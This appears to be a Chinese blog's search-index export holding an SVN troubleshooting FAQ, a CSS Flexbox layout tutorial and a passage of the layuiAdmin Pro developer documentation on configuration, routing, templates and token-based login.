    <title><![CDATA[svn常见问题汇总(持续更新)]]></title>
    <url>%2Farticles%2Fsvn%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%2F</url>
    <content type="text"><![CDATA[Skipped ‘xxxxxx’ Node remains in conflict问题描述 svn up 的时候报错显示 Skipped ‘app/Extend/assets/ttfs’ – Node remains in conflict 说app/Extend/assets/ttfs被忽略了，因为冲突而且app/Extend/assets/ttfs又被更新回来了，还是旧版本的内容，之前修改的标题并没有被修改,如图 解决方法 1svn revert --depth=infinity 冲突文件/文件夹 或者 12345svn remove --force filenamesvn resolve --accept=working filenamesvn up E220001: 遇到不可读的路径；拒绝访问在客户端试图 svn merge 总是报svn: E220001: 遇到不可读的路径；拒绝访问。这个错误 提示 : SVN 遇到不可读的路径；拒绝访问。 英文是: Unreadable path encountered; access denied 在项目的conf/svnserve.conf 中, 设置 anon-access = none 即可. 然后重启Subversion 服务. 如果本地SVN客户端查看过日志会有缓存, 需要在 设置-&gt;日志缓存-&gt;缓存的版本库 中删除有问题的版本缓存 再重新查看日志就好了. Conflict not set 对于纯文本文件因版本过时提交失败的情况，我们可以选择更新一下，然后打开”自己的修改和服务器最新版合并“后的文件（如发生冲突时的A文件），进行手动合并，处理好后选择 resolve然后提交。 对于非纯文本文件因版本过时提交失败时，我们只能牺牲一下自己，选择revert，然后更新到服务器最新版本，再修改提交]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Flex 布局]]></title>
    <url>%2Farticles%2FFlex%E5%B8%83%E5%B1%80%2F</url>
    <content type="text"><![CDATA[布局的传统解决方案: 基于盒状模型，依赖 display 属性 + position 属性 + float 属性。它对于那些特殊布局非常不方便，比如，垂直居中就不容易实现。 2009年，W3C 提出了一种新的方案—-Flex 布局，可以简便、完整、响应式地实现各种页面布局。目前，它已经得到了所有浏览器的支持，这意味着，现在就能很安全地使用这项功能。 Flex 布局将成为未来布局的首选方案。 JailBreak 为本文的所有示例制作了 Demo，也可以参考。 以下内容主要参考了下面两篇文章：A Complete Guide to Flexbox 和 A Visual Guide to CSS3 Flexbox Properties。 一、Flex 布局是什么？Flex 是 Flexible Box 的缩写，意为”弹性布局”，用来为盒状模型提供最大的灵活性。 任何一个容器都可以指定为 Flex 布局。 123.box&#123; display: flex;&#125; 行内元素也可以使用 Flex 布局。 123.box&#123; display: inline-flex;&#125; Webkit 内核的浏览器，必须加上-webkit前缀。 1234.box&#123; display: -webkit-flex; /* Safari */ display: flex;&#125; 注意: 设为 Flex 布局以后，子元素的float、clear和vertical-align属性将失效。 二、基本概念采用 Flex 布局的元素，称为 Flex 容器（flex container），简称”容器”。它的所有子元素自动成为容器成员，称为 Flex 项目（flex item），简称”项目”。 容器默认存在两根轴：水平的主轴（main axis）和垂直的交叉轴（cross axis）。 主轴的开始位置（与边框的交叉点）叫做main start，结束位置叫做main end；交叉轴的开始位置叫做cross start，结束位置叫做cross end。 项目默认沿主轴排列。单个项目占据的主轴空间叫做main size，占据的交叉轴空间叫做cross size。 三、容器的属性以下6个属性设置在容器上： flex-direction flex-wrap flex-flow justify-content align-items align-content 3.1 flex-direction 属性flex-direction属性决定主轴的方向（即项目的排列方向）。 123.box &#123; flex-direction: row | row-reverse | column | column-reverse;&#125; 它可能有4个值。 row（默认值）：主轴为水平方向，起点在左端。 row-reverse：主轴为水平方向，起点在右端。 column：主轴为垂直方向，起点在上沿。 column-reverse：主轴为垂直方向，起点在下沿。 3.2 flex-wrap 属性默认情况下，项目都排在一条线（又称”轴线”）上。flex-wrap属性定义，如果一条轴线排不下，如何换行。 123.box&#123; flex-wrap: nowrap | wrap | wrap-reverse;&#125; 它可能取三个值。 nowrap（默认）：不换行。 wrap：换行，第一行在上方。 wrap-reverse：换行，第一行在下方。 3.3 flex-flow 属性flex-flow属性是flex-direction属性和flex-wrap属性的简写形式，默认值为row nowrap。 123.box &#123; flex-flow: &lt;flex-direction&gt; || &lt;flex-wrap&gt;;&#125; 3.4 justify-content 属性justify-content属性定义了项目在主轴上的对齐方式。 123.box &#123; justify-content: flex-start | flex-end | center | space-between | space-around;&#125; 它可能取5个值，具体对齐方式与轴的方向有关。下面假设主轴为从左到右。 flex-start（默认值）：左对齐 flex-end：右对齐 center： 居中 space-between：两端对齐，之间的间隔都相等。 space-around：两侧的间隔相等。之间的间隔比与边框的间隔大一倍。 3.5 align-items 属性align-items属性定义项目在交叉轴上如何对齐。 123.box &#123; align-items: flex-start | flex-end | center | baseline | stretch;&#125; 它可能取5个值。具体的对齐方式与交叉轴的方向有关，下面假设交叉轴从上到下。 flex-start：交叉轴的起点对齐。 flex-end：交叉轴的终点对齐。 center：交叉轴的中点对齐。 baseline: 项目的第一行文字的基线对齐。 stretch（默认值）：如果项目未设置高度或设为auto，将占满整个容器的高度。 3.6 align-content 属性align-content属性定义了多根轴线的对齐方式。只有一根轴线，该属性不起作用。 123.box &#123; align-content: flex-start | flex-end | center | space-between | space-around | stretch;&#125; 该属性可能取6个值。 flex-start：与交叉轴的起点对齐。 flex-end：与交叉轴的终点对齐。 center：与交叉轴的中点对齐。 space-between：与交叉轴两端对齐，轴线之间的间隔平均分布。 space-around：每根轴线两侧的间隔都相等。所以，轴线之间的间隔比轴线与边框的间隔大一倍。 stretch（默认值）：轴线占满整个交叉轴。 四、项目的属性以下6个属性设置在容器上: order flex-grow flex-shrink flex-basis flex align-self 4.1 order属性order 排列顺序。数值越小，排列越靠前，默认为0。 4.2 flex-grow属性flex-grow 放大比例，默认为0，即如果存在剩余空间，也不放大。 123.item &#123; flex-grow: &lt;number&gt;; /* default 0 */&#125; 如果所有项目的flex-grow属性都为1，则它们将等分剩余空间（如果有的话）。如果一个项目的flex-grow属性为2，其他项目都为1，则前者占据的剩余空间将比其他项多一倍。 4.3 flex-shrink属性flex-shrink 缩小比例，默认为1，即如果空间不足，该项目将缩小。 123.item &#123; flex-shrink: &lt;number&gt;; /* default 1 */&#125; 如果所有项目的flex-shrink属性都为1，当空间不足时，都将等比例缩小。如果一个项目的flex-shrink属性为0，其他项目都为1，则空间不足时，前者不缩小。 负值对该属性无效。 4.4 flex-basis属性flex-basis 分配多余空间之前，占据的主轴空间。浏览器根据这个属性，计算主轴是否有多余空间。它的默认值为auto，即项目的本来大小。 123.item &#123; flex-basis: &lt;length&gt; | auto; /* default auto */&#125; 它可以设为跟width或height属性一样的值（比如350px），则项目将占据固定空间。 4.5 flex属性flex 是flex-grow, flex-shrink 和 flex-basis的简写，默认值为0 1 auto。后两个属性可选。 123.item &#123; flex: none | [ &lt;'flex-grow'&gt; &lt;'flex-shrink'&gt;? || &lt;'flex-basis'&gt; ]&#125; 该属性有两个快捷值：auto (1 1 auto) 和 none (0 0 auto)。 建议优先使用这个属性，而不是单独写三个分离的属性，因为浏览器会推算相关值。 4.6 align-self属性align-self 允许单个项目有与其他项目不一样的对齐方式，可覆盖align-items属性。默认值为auto，表示继承父元素的align-items属性，如果没有父元素，则等同于stretch。 123.item &#123; align-self: auto | flex-start | flex-end | center | baseline | stretch;&#125;]]></content>
      <categories>
        <category>前端开发</category>
      </categories>
      <tags>
        <tag>网页布局</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[layuiAdmin 专业版（单页面）开发者文档]]></title>
    <url>%2Farticles%2FlayuiAdmin-%E4%B8%93%E4%B8%9A%E7%89%88%EF%BC%88%E5%8D%95%E9%A1%B5%E9%9D%A2%EF%BC%89%E5%BC%80%E5%8F%91%E8%80%85%E6%96%87%E6%A1%A3%2F</url>
    <content type="text"><![CDATA[在线演示 正版授权 layuiAdmin pro （单页版）是完全基于 layui 架构而成的后台管理模板系统，可以更轻松地实现前后端分离，它是 mvc 的简化版，全面接管 视图 和 页面路由，并可自主完成数据渲染，服务端通常只负责数据接口，而前端只需专注视图和事件交互，所有的页面动作都是在一个宿主页面中完成，因此这赋予了 layuiAdmin 单页面应用开发的能力。 题外 该文档适用于 layuiAdmin 专业版（单页面），阅读之前请务必确认是否与你使用的版本对应。 熟练掌握 layuiAdmin 的前提是熟练掌握 layui，因此除了本篇文档， layui 的文档 也是必不可少的存在。 快速上手部署 解压文件后，将 layuiAdmin 完整放置在任意目录 通过本地 web 服务器去访问 ./start/index.html 即可运行 Demo 由于 layuiAdmin 可采用前后端分离开发模式，因此你无需将其放置在你的服务端 MVC 框架中，你只需要给 layuiAdmin 主入口页面（我们也称之为：宿主页面）进行访问解析，它即可全权完成自身路由的跳转和视图的呈现，而数据层则完全通过服务端提供的异步接口来完成。 目录说明 src/: layuiAdmin 源代码，通常用于开发环境（如本地），推荐你在本地开发时，将 ./start/index.html 中的 layui.css 和 layui.js 的引入路径由 dist 改为 src 目录。 src/controller/：存放 JS 业务模块，即对视图进行事件等交互性处理 src/lib/：layuiAdmin 的核心模块，一般不推荐修改 src/style/：存放样式，其中 admin.css是核心样式 src/views/：存放视图文件。其中 layout.html 是整个框架结构的承载，一般不推荐做大量改动。 src/config.js：layuiAdmin 的全局配置文件，可随意修改。 src/index.js：layuiAdmin 的入口模块，一般不推荐修改 dist/: 通过 gulp 将 layuiAdmin src 目录的源代码进行构建后生成的目录（即：将 JS 和 CSS 文件进行了压缩等处理），通常用于线上环境。关于 gulp 的使用，下文也有介绍。 start/: 存放 layuiAdmin 的入口页面、模拟接口数据、layui 宿主页面你所看到的 start/index.html 是我们提供好的宿主页面，它是整个单页面的承载，所有的界面都是在这一个页面中完成跳转和渲染的。事实上，宿主页面可以放在任何地方，但是要注意修改里面的 &lt;link&gt; &lt;script&gt; 的 src 和 layui.config 中 base 的路径。 全局配置当你已经顺利在本地预览了 layuiAdmin 后，你一定迫不及待关注更深层的结构。打开 src 目录，你将看到 config.js，里面存储着所有的默认配置。你可以按照实际需求选择性修改，下面是 layuiAdmin 默认提供的配置： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465layui.define(['laytpl', 'layer', 'element', 'util'], function(exports)&#123; exports('setter', &#123; container: 'LAY_app' //容器ID ,base: layui.cache.base //记录layuiAdmin文件夹所在路径 ,views: layui.cache.base + 'views/' //视图所在目录 ,entry: 'index' //默认视图文件名 ,engine: '.html' //视图文件后缀名 ,pageTabs: false //是否开启页面选项卡功能。单页版不推荐开启 ,name: 'layuiAdmin Pro' ,tableName: 'layuiAdmin' //本地存储表名 ,MOD_NAME: 'admin' //模块事件名 ,debug: true //是否开启调试模式。如开启，接口异常时会抛出异常 URL 等信息 ,interceptor: false //是否开启未登入拦截 //自定义请求字段 ,request: &#123; tokenName: 'access_token' //自动携带 token 的字段名。可设置 false 不携带。 &#125; //自定义响应字段 ,response: &#123; statusName: 'code' //数据状态的字段名称 ,statusCode: &#123; ok: 0 //数据状态一切正常的状态码 ,logout: 1001 //登录状态失效的状态码 &#125; ,msgName: 'msg' //状态信息的字段名称 ,dataName: 'data' //数据详情的字段名称 &#125; //独立页面路由，可随意添加（无需写参数） ,indPage: [ '/user/login' //登入页 ,'/user/reg' //注册页 ,'/user/forget' //找回密码 ,'/template/tips/test' //独立页的一个测试 demo ] //扩展的第三方模块 ,extend: [ 'echarts', //echarts 核心包 'echartsTheme' //echarts 主题 ] //主题配置 ,theme: &#123; //配色方案，如果用户未设置主题，第一个将作为默认 color: [&#123; main: '#20222A' //主题色 ,selected: '#009688' //选中色 ,logo: '' //logo区域背景色 ,header: '' //头部区域背景色 ,alias: 'default' //默认别名 &#125;] //为了减少篇幅，更多主题此处不做列举，可直接参考 config.js //初始的颜色索引，对应上面的配色方案数组索引 //如果本地已经有主题色记录，则以本地记录为优先，除非清除 localStorage（步骤：F12呼出调试工具→Aplication→Local Storage→选中页面地址→layuiAdmin→再点上面的X） // 1.0 正式版开始新增 ,initColorIndex: 0 &#125; &#125;);&#125;); 侧边菜单 在 start/json/menu.js 文件中，我们放置了默认的侧边菜单数据，你可以去随意改动它。 如果你需要动态加载菜单，你需要将 views/layout.html 中的对应地址改成你的真实接口地址侧边菜单最多可支持到三级。无论你采用静态的菜单还是动态的，菜单的数据格式都必须是一段合法的 JSON，且必须符合以下规范： 1234567891011121314151617181920212223&#123; "code": 0, //状态码，key 名可以通过 config.js 去重新配置 "msg":"", //提示信息 "data": [&#123; //菜单数据，key名可以通过 config.js 去重新配置 "name": "component", //一级菜单名称（与视图的文件夹名称和路由路径对应） "title": "组件", //一级菜单标题 "icon": "layui-icon-component", //一级菜单图标样式 "jump": '' ,//自定义一级菜单路由地址，默认按照 name 解析。一旦设置，将优先按照 jump 设定的路由跳转 "spread": true ,//是否默认展子菜单（1.0.0-beta9 新增） "list": [&#123; //二级菜单 "name": "grid", //二级菜单名称（与视图的文件夹名称和路由路径对应） "title": "栅格", //二级菜单标题 "jump": '', //自定义二级菜单路由地址 "spread": true, //是否默认展子菜单（1.0.0-beta9 新增） "list": [&#123; //三级菜单 "name": "list", //三级菜单名（与视图中最终的文件名和路由对应），如：component/grid/list "title": "等比例列表排列" //三级菜单标题 &#125;,&#123; "name": "mobile", "title": "按移动端排列" &#125; &#125;]&#125; TIPS：实际运用时，切勿出现上述中的注释，否则将不是合法的 JSON ，会出现解析错误。 需要注意的是以下几点： 当任意级菜单有子菜单，点击该菜单都只是收缩和展开操作，而并不会跳转，只有没有子菜单的菜单才被允许跳转。 菜单的路由地址默认是按照菜单层级的 name 来设定的。我们假设一级菜单的 name 是：a，二级菜单的是：b，三级菜单的 name 是 c，那么： 三级菜单最终的路由地址就是：/a/b/c 如果二级菜单没有三级菜单，那么二级菜单就是最终路由，地址就是：/a/b/ 如果一级菜单没有二级菜单，那么一级菜单就是最终路由，地址就是：/a/ 但如果你设置了 参数 jump，那么就会优先读取 jump 设定的路由地址，如：”jump”: “/user/set” 路由layuiAdmin 的路由是采用 location.hash 的机制，即路由地址是放在 ./#/ 后面，并通过 layui 自带的方法： layui.router() 来进行解析。每一个路由都对应一个真实存在的视图文件，且路由地址和视图文件的路径是一致的（相对 views 目录）。因此，你不再需要通过配置服务端的路由去访问一个页面，也无需在 layuiAdmin 内部代码中去定义路由，而是直接通过 layuiAdmin 的前端路由去访问，即可匹配相应目录的视图，从而呈现出页面结果。 路由规则1./#/path1/path2/path3/key1=value1/key2=value2… 一个实际的示例： 12./#/user/set./#/user/set/uid=123/type=1#xxx（下面将以这个为例继续讲解） 当你需要对路由结构进行解析时，你只需要通过 layui 内置的方法 layui.router() 即可完成。如上面的路由解析出来的结果是： 123456&#123; path: ['user','set'] ,search: &#123;uid: 123, type: 1&#125; ,href: 'user/set/uid=123/type=1' ,hash: 'xxx'&#125; 可以看到，不同的结构会自动归纳到相应的参数中，其中： path：存储的是路由的目录结构 search：存储的是路由的参数部分 href：存储的是 layuiAdmin 的完整路由地址 hash：存储的是 layuiAdmin 自身的锚记，跟系统自带的 location.hash 有点类似 通过 layui.router() 得到路由对象后，你就可以对页面进行个性化操作、异步参数传值等等。如： 12345678//在 JS 中获取路由参数var router = layui.router();admin.req(&#123;url: 'xxx',data: &#123; uid: router.search.uid&#125;&#125;); 123456789&lt;!-- 在动态模板中获取路由参数 --&gt;&lt;script type="text/html" template lay-url="./xxx/?uid=&#123;&#123; layui.router().search.uid &#125;&#125;"&gt;…&lt;/script&gt;&lt;!-- 或 --&gt;&lt;script type="text/html" template lay-url="./xxx/" lay-data="&#123;uid:'&#123;&#123; layui.router().search.uid &#125;&#125;'&#125;"&gt;…&lt;/script&gt; 路由跳转通过上文的路由规则，你已经大致清楚了 layuiAdmin 路由的基本原理和解析方法。那么如何完成路由的跳转呢？ 在视图文件的 HTML 代码中，通过对任意元素设定 lay-href=&quot;/user/set/uid=123/type=1&quot; ，好处是：任意元素都可以触发跳转。缺点是：只能在浏览器当前选项卡完成跳转（注意：不是 layuiAdmin 的选项卡） 直接对 a 标签设定 href，如： &lt;a href=&quot;#/user/set&quot;&gt;text&lt;/a&gt; 。好处是：你可以通过设定 target=&quot;_blank&quot; 来打开一个浏览器新选项卡。缺点是：只能设置 a 标签，且前面必须加 /#/ 在 JS 代码中，还可通过 location.hash = &#39;/user/set&#39;; 来跳转。前面无需加 #，它会自动追加。 路由结尾在路由结尾部分出现的 / 与不出现，是两个完全不同的路由。比如下面这个： user/set读取的视图文件是：.views/user/set.html user/set/读取的视图文件是：./views/user/set/index.html （TIPS：这里的 index.html 即是目录下的默认主视图，下文会有讲解） 因此一定要注意结尾处的 /，避免视图读取错误。 视图这或许是你应用 layuiAdmin 时的主要焦点，在开发过程中，你的大部分精力都可能会聚焦在这里。它取代了服务端 MVC 架构中的 view 层，使得应用开发变得更具扩展性。因此如果你采用 layuiAdmin 的 SPA（单页应用）模式，请务必要抛弃服务端渲染视图的思想，让页面的控制权限重新回归到前端吧！ views 目录存放的正是视图文件，你可以在该目录添加任意的新目录和新文件，通过对应的路由即可访问。 注意：如果是单页面模式，视图文件通常是一段 HTML 碎片，而不能是一个完整的 html 代码结构。 视图与路由的关系每一个视图文件，都对应一个路由。其中 index.html 是默认文件（你也可以通过 config.js 去重新定义）。视图文件的所在目录决定了路由的访问地址，如： 视图路径 对应的路由地址 ./views/user/index.html /user/ ./views/user.html /user ./views/user/set/index.html /user/set/ ./views/user/set.html /user/set ./views/user/set/base.html /user/set/base 通过上述的表格列举的对应关系，可以总结出： 当视图文件是 index.html，那么路由地址就是它的上级目录（相对 _views_），以 / 结尾 当视图文件不是 index.html，那么路由地址就是它的上级目录+视图文件名，不以 / 结尾 值得注意的是：路由路径并非最多只能三级，它可以无限极。但对应的视图也必须存放在相应的层级目录下 视图中加载 JS 模块在视图文件中，除了写 HTML，也可以写 JavaScript 代码。如： 123456789&lt;div id=“LAY-demo-hello”&gt;Hello layuiAdmin&lt;/div&gt;&lt;script&gt;layui.use('admin', function()&#123; var $ = layui.jquery; admin.popup(&#123; content: $('#LAY-demo-hello').html() &#125;);&#125;);&lt;/script&gt; 如果该视图对应的 JS 代码量太大，我们更推荐你在 controller 目录下新增一个业务模块，并在视图中直接 layui.use 去加载该模块。下面以控制台主页 index.html 为例： 12345678910111213141516171819&lt;div&gt;html区域&lt;div&gt;&lt;script&gt;//加载 controller 目录下的对应模块/*小贴士： 这里 console 模块对应 的 console.js 并不会重复加载， 然而该页面的视图可能会重新插入到容器，那如何保证脚本能重新控制视图呢？有两种方式： 1): 借助 layui.factory 方法获取 console 模块的工厂（回调函数）给 layui.use 2): 直接在 layui.use 方法的回调中书写业务代码，即: layui.use('console', function()&#123; //同 console.js 中的 layui.define 回调中的代码 &#125;); 这里我们采用的是方式1。其它很多视图中采用的其实都是方式2，因为更简单些，也减少了一个请求数。*/layui.use('console', layui.factory('console'));&lt;/script&gt; 当视图被渲染后，layui.factory 返回的函数也会被执行，从而保证在不重复加载 JS 模块文件的前提下，保证脚本能重复执行。 动态模板layuiAdmin 的视图是一个“动静结合”的载体，除了常规的静态模板，你当然还可以在视图中存放动态模板，因此它可谓是焦点中的焦点。 定义模板在视图文件中，通过下述规则定义模板： 123&lt;script type="text/html" template&gt;&lt;!-- 动态模板碎片 --&gt;&lt;/script&gt; 下面是一个简单的例子： 1234&lt;script type="text/html" template&gt;当前 layuiAdmin 的版本是：&#123;&#123; layui.admin.v &#125;&#125;路由地址：&#123;&#123; layui.router().href &#125;&#125;&lt;/script&gt; 在不对动态模板设定数据接口地址的情况下，它能读取到全局对象。但更多时候，一个动态模板应该是对应一个接口地址，如下所示： 12345678&lt;script type="text/html" template lay-url="接口地址"&gt; 我叫：&#123;&#123; d.data.username &#125;&#125; &#123;&#123;# if(d.data.sex === '男')&#123; &#125;&#125; 公的 &#123;&#123;# &#125; else &#123; &#125;&#125; 母的 &#123;&#123;# &#125; &#125;&#125;&lt;/script&gt; 模板中的 d 对应的是你接口返回的 json 转化后的一维对象，如： 1234567&#123; "code": 0, "data": &#123; "username": "贤心", "sex": "男" &#125;&#125; 那么，上述动态模板最终输出的结果就是： 12我叫：贤心公的 模板基础属性动态模板支持以下基础属性 lay-url用于绑定模板的数据接口地址，支持动态模板解析，如： 123&lt;script type="text/html" template lay-url="https://api.xxx.com?id=&#123;&#123; layui.router().search.id &#125;&#125;"&gt;&lt;!-- 动态模板碎片 --&gt;&lt;/script&gt; lay-data用于定义接口请求的参数，其值是一个 JavaScript object 对象，同样支持动态模板解析，如： 123&lt;script type="text/html" template lay-url="" lay-data="&#123;id: '&#123;&#123; layui.router().search.id &#125;&#125;', type: 1&#125;"&gt;&lt;!-- 动态模板碎片 --&gt;&lt;/script&gt; lay-headers用户定义接口请求的 Request Headers 参数，用法与 lay-data 的完全类似，支持动态模板解析。 lay-done接口请求完毕并完成视图渲染的回调脚本，里面支持写任意的 JavaScript 语句。事实上它是一个封闭的函数作用域，通过给 Function 实例返回的函数传递一个参数 d，用于得到接口返回的数据： 123&lt;script type="text/html" template lay-url="" lay-done="console.log(d);"&gt;&lt;!-- 动态模板碎片 --&gt;&lt;/script&gt; 很多时候，你在动态模板中可能会放入一些类似于 layui 的 form 元素，而有些控件需要执行 form.render() 才会显示，这时，你可以对 lay-done 赋值一个全局函数，如： 123456789101112131415&lt;script type="text/html" template lay-url="" lay-done="layui.data.done(d);"&gt; &lt;div class="layui-form" lay-filter="LAY-filter-demo-form"&gt; &lt;input type="checkbox" title="复选框"&gt;&lt;/div&gt;&lt;/script&gt;&lt;!-- 注意：别看眼花了，下面可不是动态模板，而是 JS 脚本区域 --&gt;&lt;script&gt;layui.data.done = function(d)&#123; layui.use(['form'], function()&#123; var form = layui.form; form.render(null, 'LAY-filter-demo-form'); //渲染该模板下的动态表单 &#125;);&#125;;&lt;/script&gt; TIPS： 如果模板渲染完毕需要处理过多的交互，我们强烈推荐你采用上述的方式定义一个全局函数赋值给 lay-done，会极大地减少维护成本。 无需担心该全局函数的冲突问题，该函数是一次性的。其它页面即便声明了一个同样的函数，也只是用于新的视图，丝毫不会对之前的视图造成任何影响。 layui.data.done 中的 done 可以随意命名，但需与 lay-done 的赋值对应上。 模板语法动态模板基于 layui 的 laytpl 模块，详细语法可见： 传送门 登录与接口鉴权由于 layuiAdmin 接管了视图层，所以不必避免可能会与服务端分开部署，这时你有必要了解一下 layuiAdmin 默认提供的：从 登录 到 接口鉴权 ，再到 注销 的整个流程。 登录拦截器进入登入页面登入成功后，会在 localStorage 的本地表中写入一个字段。如： access_token （名称可以在 config.js 自定义）。拦截器判断没有 access_token 时，则会跳转到登入页。尽管可以通过伪造一个假的 access_token 绕过视图层的拦截，但在请求接口时，会自动带上 access_token，服务端应再次做一层校验。 流程 打开 config.js ，将 interceptor 参数设置为 true（该参数为 1.0.0-beta6 开始新增）。那么，当其未检查到 access_token 值时，会强制跳转到登录页面，以获取 access_token。 打开登录对应的视图文件 views/user/login.html，在代码最下面，你将看到一段已经写好的代码，你需要的是将接口地址改为服务端的真实接口，并返回 access_token 值。 layuiAdmin 会将服务端返回的 access_token 值进行本地存储，这时你会发现 layuiAdmin 不再强制跳转到登录页面。并在后面每次请求服务端接口时，都会自动在参数和 Request Headers 中带上 access_token，以便服务端进行鉴权。 若鉴权成功，顺利返回数据；若鉴权失败，服务端的 code 应返回 1001（可在 config.js 自定义） ， layuiAdmin 将会自动清空本地无效 token 并跳转到登入页。 退出登录：重新打开 controller/common.js，搜索 logout，配上注销接口即可。 如果是在其它场景请求的接口（如：table.render()），那么你需要获取本地存储的 token 复制给接口参数，如： 1234567table.render(&#123; elem: '#xxxx' ,url: 'url' ,where: &#123; access_token: layui.data('layuiAdmin').access_token &#125;&#125;) 事实上，layuiAdmin 的所有 Ajax 请求都是采用 admin.req(options)，它会自动传递 access_token，因此推荐你在 JS 执行 Ajax 请求时直接使用它。其中参数 options 和 $.ajax(options) 的参数完全一样。 接口鉴权我们推荐服务端遵循 JWT（JSON Web Token） 标准进行鉴权。对 JWT 不甚了解的同学，可以去搜索一些相关资料，会极大地增加应用的可扩展性。当然，你也可以直接采用传统的 cookie / session 机制。 基础方法 config 模块 你可以在任何地方通过 layui.setter 得到 config.js 中的配置信息 admin 模块 var admin = layui.admin; admin.req(options)Ajax 请求，用法同 $.ajax(options)，只是该方法会进行错误处理和 token 的自动传递 admin.screen()获取屏幕类型，根据当前屏幕大小，返回 0 - 3 的值0: 低于768px的屏幕1：768px到992px之间的屏幕2：992px到1200px之间的屏幕3：高于1200px的屏幕 admin.exit()清除本地 token，并跳转到登入页 admin.sideFlexible(status)侧边伸缩。status 为 null：收缩；status为 “spread”：展开 admin.on(eventName, callback)事件监听，下文会有讲解 admin.popup(options)弹出一个 layuiAdmin 主题风格的 layer 层，参数 options 跟 layer.open(options) 完全相同 admin.popupRight(options)在屏幕右侧呼出一个面板层。options 同上。 1234567admin.popupRight(&#123; id: 'LAY-popup-right-new1' //定义唯一ID，防止重复弹出 ,success: function()&#123; //将 views 目录下的某视图文件内容渲染给该面板 layui.view(this.id).render('视图文件所在路径'); &#125;&#125;); admin.resize(callback)窗口 resize 事件处理，我们推荐你使用该方法取代 jQuery 的 resize 事件，以避免多页面标签下可能存在的冲突。 admin.events admin.events.refresh()刷新当前右侧区域 admin.events.closeThisTabs()关闭当前标签页 admin.events.closeOtherTabs()关闭其它标签页 admin.events.closeAllTabs()关闭全部标签页 view 模块 var view = layui.view; view(id)获取指定容器，并返回一些视图渲染的方法，如： 123456789//渲染视图，viewPath 即为视图路径view('#id').render(viewPath).then(function()&#123; //视图文件请求完毕，视图内容渲染前的回调&#125;).done(function()&#123; //视图文件请求完毕和内容渲染完毕的回调&#125;); //直接向容器插入 html，tpl 为 模板字符；data 是传入的数据。该方法会自动完成动态模板解析view('#id').send(tpl, data); 另外，render 方法支持动态传参，以用于视图内容接受。如： 12345678admin.popup(&#123; id: 'LAY-popup-test1' ,success: function()&#123; view(this.id).render('视图文件所在路径', &#123; id: 123 //这里的 id 值你可以在一些事件中动态获取（如 table 模块的编辑） &#125;); &#125;&#125;) 那么，在视图文件中，你可以在动态模板中通过 \{\{ d.params.xxx \}\} 得到传入的参数，如： 1234567&lt;script type="text/html" template lay-url="http://api.com?id=&#123;&#123; d.params.id &#125;&#125;"&gt;配置了接口的动态模板，且接口动态获取了 render 传入的参数：&#123;&#123; d.params.id &#125;&#125;&lt;/script&gt;&lt;script type="text/html" template&gt;也可以直接获取：&lt;input type="hidden" name="id" value="&#123;&#123; d.params.id &#125;&#125;"&gt;&lt;/script&gt; 而如果是在 JS 语句中去获取模板传递过来的变量，可以借助动态模板的 lay-done 属性去实现，如： 123&lt;script type="text/html" template lay-done="layui.data.sendParams(d.params)"&gt; &lt;/script&gt; 然后在 JS 语句中通过执行动态模板 lay-done 中对应的方法得到对应的参数值： 123456789101112131415161718&lt;script&gt;//定义一个 lay-done 对应的全局方法，以供动态模板执行layui.data.sendParams = function(params)&#123; console.log(params.id) //得到传递过来的 id 参数（或其他参数）值 //通过得到的参数值，做一些你想做的事 //… //若需用到 layui 组件，layui.use 需写在该全局方法里面，如： layui.use(['table'], function()&#123; var table = layui.table; table.render(&#123; elem: '' ,url: 'url?id='+ params.id &#125;); &#125;);&#125;;&lt;/script&gt; 注意：上述实现需保证 layuiAdmin 为 1.2.0+` 总之，驾驭好 view().render().done(callback) 对您的项目开发至关重要。 ID唯一性如果你开启了标签页功能，请务必注意 ID 的冲突，尤其是在你自己绑定事件的情况。ID 的命令可以遵循以下规则来规避冲突： 1LAY-路由-任意名 以_消息中心_页面为例，假设它的路由为：/app/message/，那么 ID 应该命名为： 1&lt;button class="layui-btn" id="LAY-app-message-del"&gt;删除&lt;/button&gt; 实用组件Hover 提示层通过对元素设置 lay-tips=&quot;提示内容&quot; 来开启一个 hover 提示，如： 1&lt;i class="layui-icon layui-icon-tips" lay-tips="要支持的噢" lay-offset="5"&gt;&lt;/i&gt; 其中 lay-offset 用于定于水平偏移距离（单位px），以调整箭头让其对准元素 事件监听 hash监听路由地址改变 1234// 下述中的 xxx 可随意定义，不可与已经定义的 hash 事件同名，否则会覆盖上一事件admin.on('hash(xxx)', function(router)&#123; console.log(router); //得到路由信息&#125;); side监听侧边伸缩 1234// 下述中的 xxx 可随意定义，不可与已经定义的 side 事件同名，否则会覆盖上一事件admin.on('side(xxx)', function(obj)&#123; console.log(obj.status); //得到伸缩状态：spread 为展开状态，其它值为收缩状态&#125;); 兼容性layuiAdmin 使用到了 layui 的栅格系统，而栅格则是基于浏览器的媒体查询。ie8、9不支持。 所以要在宿主页面（如 start/index.html ）加上下面这段保证兼容： 12345&lt;!-- 让IE8/9支持媒体查询，从而兼容栅格 --&gt;&lt;!--[if lt IE 9]&gt;&lt;script src="https://cdn.staticfile.org/html5shiv/r29/html5.min.js"&gt;&lt;/script&gt;&lt;script src="https://cdn.staticfile.org/respond.js/1.4.2/respond.min.js"&gt;&lt;/script&gt;&lt;![endif]--&gt; 缓存问题由于单页面版本的视图文件和静态资源模块都是动态加载的，所以可能存在浏览器的本地缓存问题，事实上我们也考虑到这个，因此，为了避免改动后的文件未及时生效，你只需在入口页面（默认为start/index.html）中，找到 layui.config，修改其 version 的值即可。 我们推荐你分场景来更新缓存： 场景一：如果项目是在本地开发。你可以设置 version 为动态毫秒数，如： 1version: new Date().getTime() //这样你每次刷新页面，都会更新一次缓存 场景二：如果项目是在线上运行。建议你手工更新 version，如： 1version: '1.0.0' //每次发布项目时，跟着改动下该属性值即可更新静态资源的缓存 升级事项从官网更新资源包后，除了 src 和 dist 目录需要注意一下，其它目录和文件均可覆盖，下面以 src 为例（dist 由于是 src 构建后生成的目录，所以本质是和 src 一样的） src 目录下可以直接覆盖的有： src/lib/ src/style/ src/index.js 需要灵活调配的有： src/controller/ src/views/ src/config.js如果没有改动默认配置，事实上 config.js 也可以覆盖升级 开发过程中，建议同时运行两个 layuiAdmin 